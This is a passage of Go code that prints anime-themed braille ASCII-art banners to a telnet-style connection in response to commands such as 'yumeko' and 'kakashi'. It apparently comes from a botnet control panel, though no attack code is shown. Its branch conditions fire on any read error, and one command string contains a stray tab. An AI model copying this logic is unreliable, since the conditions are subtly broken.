this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⣲⡟⠅⡡⠄⠄⡀⠄⠄⠄⠄⢀⣈⢿⠄⢸⠄⠄⡀⠄⠄⠄⠄⠄⠄⠠⢷⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⡟⣈⣊⣒⣤⣤⠔⠄⠄⠄⠄⠲⣧⢜⣣⣼⣀⠄⡀⠄⠄⣀⣤⠄⠄⣸⣿⠄⠄⠄⠄⠄⠄⠄⠄⢀⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣟⣭⣤⠂⡄⠄⡀⢶⣼⣦⡞⠈⠉⠉⠁⠄⠉⠁⠄⠄⣾⣿⣭⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣴⣇⣼⣿⣿⣿⣿⣇⢰⠄⠄⢀⢀⠄⠄⠄⣰⣿⣿⠇⠄⢀⡀⣦⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⠟⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⡀⠄⠄⠄⣠⣿⣿⣿⣿⣿⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⡏⠄⠄⠄⠉⠙⠿⣿⣯⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣷⣦⣂⣀⡀⠄⠄⠄⠄⠉⠉⠉⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠄⣧⠄⣦⠄⠄⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿⡆⣿⠄⣆⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣻⠿⣧⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⡛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠄⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠉⠉⠙⠛⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠄⠈⠈⠄⠄⣠⣾⠄⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⠁⠄⠄⠄⠄⠄⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣤⣤⣾⠟⠛⣧⢀⣼⣿⣿⣿⣿⣿⣿⣿⠁⠄⠄⠄⠄⢀⣾⣿⣿⣿⣄⣄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⢻⣿⣿⣿⡟⠉⠄⠄⠈⣿⣿⣿⡏⣿⣿⣿⣿⠃⠄⠄⠄⠄⢠⣾⣿⣿⣿⣿⡇⠁⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠄⠙⢿⣿⡇⠄⠄⠄⠄⣿⣿⠿⢀⣿⣿⣿⠃⠄⠄⠄⠄⣠⣿⡿⣿⣿⣿⡟⠁⠄⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠄⡀⢼⣿⣇⠄⠄⢀⣀⡿⠋⠄⠘⢣⣿⣃⠄⠄⠄⠄⣰⣿⣿⣧⠙⣿⣿⣧⠴⠶⢴⠛⠄⠙⠿⠻⠋⢋⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠄⠄⠄⠄⠉⠻⣤⠞⠛⣽⡇⠄⠄⠄⠊⠄⠄⠄⠄⠄⠸⣿⣿⣿⣟⡄⠈⠛⢻⣶⣄⣀⣀⣦⡴⠄⠄⠄⢛⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⣧⣀⣀⢀⣰⡉⢀⣰⠏⠁⠄⠄⣇⠄⠄⡀⠄⠄⠄⠄⠹⣿⣿⣿⣶⡀⠄⠄⠄⠉⠉⠉⠁⢀⣀⣀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠿⠛⠛⠛⠛⠁⠄⠄⠄⣠⣿⣧⠄⠘⣦⡀⠠⠄⠄⠄⠘⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m              NARUTO 2TH HOKAGE\033[0m \r\n"))				      
					  continue
        }
if err != nil || cmd == "yumeko" || cmd == "YUMEKO	" {
this.conn.Write([]byte("\033[2J\033[1H"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⡇⡆⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⠇⡃⠄⠄⠄⢀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢠⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢰⣆⡧⠄⠄⠄⢸⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣼⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡟⣩⡖⠄⠄⠄⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⠄⠄⠄⠄⠄⠄⣶⠄⠄⢀⡇⠄⢀⣠⢀⣠⣤⣳⣿⣿⣷⣶⣷⣶⣿⣿⣄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⠄⢰⠄⢀⢠⣤⡶⡿⠿⢿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⡽⠚⣉⣁⣈⣉⡻⡿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠐⢚⣾⣯⠾⠟⠛⠛⠛⠛⠛⠶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣾⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠱⣿⣟⢉⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡝⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠩⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⡆⠄⠄⠄⠄⢀⢀⣀⣤⣤⣤⣤\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣵⣿⠇⠄⠄⠄⠄⠄⠄⠄⠄⠘⠛⠻\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠊⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠄⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⡀⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠻⣿⣿⣿⣿⣿⣛⣛⠛⠋⣙⣛⠧⢄⣵⣾⣿⣿⣿⠟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠁⠄⠂⠄⠄⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⠄⠄⢀⡀⠄⠄⠄⠸⢦⣄⡀⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠖⠙⣹⣿⢿⣿⣿⣿⣿⣿⡿⠋⠄⠄⠄⠄⠄⠄⠄⠄⠘⣿⣧⡀⠄⠄⠈⢻⣿⣷\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠄⠄⠄⢊⠭⢌⣛⠛⠛⠛⠛⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣷⣤⡀⠄⠄⠹⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡀⠄⠄⠄⠉⠑⢶⣿⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⣿⣆⡀⢀⣹\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠑⠄⢄⡀⠄⣊⣧⣷⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢾⣇⠄⠄⠄⠘⣿⣿⣿⣷⣿⣹\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⠍⢣⣾⣿⣛⡻⡲⡄⠄⠄⠄⠄⠄⠄⠄⠄⢺⣿⣆⠄⠄⠄⠘⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢈⣴⣿⣿⣿⣿⣧⣿⢣⠄⠄⠄⠄⠄⠄⠄⠄⠸⣿⣿⡆⠄⠄⠄⠘⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠻⢿⣿⣿⣿⣿⣹⠝⡆⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⡄⠄⠄⠄⢹⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠻⣿⣿⡟⣿⠈⣱⡄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿⠄⠄⠄⠄⢙⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢻⠄⠙⠄⢀⠡⠄⠄⠄⠄⠄⠄⠄⠈⣿⣿⣿⣷⠄⠄⠄⠈⢹⣿\033[0m \r\n"))
         continue
          }
if err != nil || cmd == "kakashi" || cmd == "KAKASHI" {
this.conn.Write([]byte("\033[2J\033[1H"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣻⣭⣶⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⠿⡻⢯⠿⠶⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠄⠄⠈⠉⠉⠙⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⠛⠛⠋⠻⡏⠻⣿⣿⣿⣆⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣯⣿⣟⡻⢿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⡏⠙⠻⣿⣿⣿⠃⠄⠄⠄⠄⢀⣴⣶⣶⠶⣶⣶⣶⣶⣦⣤⣤⣄⣐⣶⣶⣶⣶⣶⣦⣬⣿⠎⠁⠄⠙⣿⣧⠄⠈⢻⣿⣿⣯⡛⢿⣦⣖⣶⣾⣿⣿⣶⣶⣾⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣿⣿⣿⠄⠄⠄⠄⠄⣼⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⡿⠿⣿⡿⣿⡿⠄⠄⠄⠄⠈⢿⠄⠄⠄⠈⢻⣿⣿⣱⣯⣿⣷⢝⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⣿⣿⣿⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣱⡿⣋⣙⠿⣦⣾⣿⠇⣸⠄⠄⠄⠄⠄⠄⠄⠄⠄⢿⣿⣿⡟⣿⣿⣿⣿⣶⣾⣽⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣯⣤⣀⣈⠿⠿⠂⠄⠄⠄⠄⢧⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣃⢿⣀⠿⣸⣷⢹⣿⡏⢠⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⣼⣿⣷⣟⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⠋⠉⠻⢿⣿⡷⠄⠄⠄⠄⠄⠄⠸⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⡻⠮⠛⠿⠟⣁⣾⣿⣷⣿⠄⠄⠄⠄⠄⠄⠄⢀⢰⡇⢏⢻⣿⣿⣶⠉⠉⠉⠹⠿⣿⠿⠋⠙⠿⠿⠟⠉⠉\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⢩⣽⠄⠄⠄⠄⠄⠄⠄⢸⣶⣤⣤⣀⣀⠈⠛⠿⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠏⠄⠄⠄⠄⣀⣴⣾⣿⣿⠋⣸⣸⣿⡍⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⢠⠄⠄⡄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣯⡟⢿⣿⣿⣿⣿⠿⠤⣀⡀⠄⠄⡀⠄⠄⢤⣤⣄⢠⡀⣤⡤⠄⢀⣠⡄⠄⠄⣶⡶⣠⣿⣿⡇⣰⣹⠿⠸⠇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
